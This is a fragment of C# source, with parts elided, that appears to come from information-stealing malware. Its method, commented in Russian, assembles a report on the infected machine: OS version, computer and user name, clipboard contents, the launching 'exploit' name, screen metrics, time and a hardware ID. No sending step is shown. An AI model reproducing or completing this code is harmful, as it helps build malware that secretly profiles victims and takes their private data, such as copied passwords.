...
namespace made
{
    class SystemInfo
    {
        public static void GetSystem() // Запись файла Information
        {
            ...
            string InfoText = (
                       " ┌───────⠀───────────────────────────⠀───────┐" +
                     "\n Операционная система: " + GetSystemVersion() +
                     "\n ПК: " + compname + "/" + username +
                     "\n Буфер обмена: " + Buffer.GetBuffer() +
                     "\n Запуск из: " + Help.ExploitName +
                     "\n ─────────⠀⠀•⠀⠀⠀•⠀⠀⠀•⠀⠀─────────" +
                     "\n Скрин экрана: " + ScreenMetrics() +
                     "\n Время: " + DateTime.Now +
                     "\n HWID: " + GetProcessorID() +
                     "\n ─────────⠀⠀•⠀⠀⠀•⠀⠀⠀•⠀⠀─────────" +
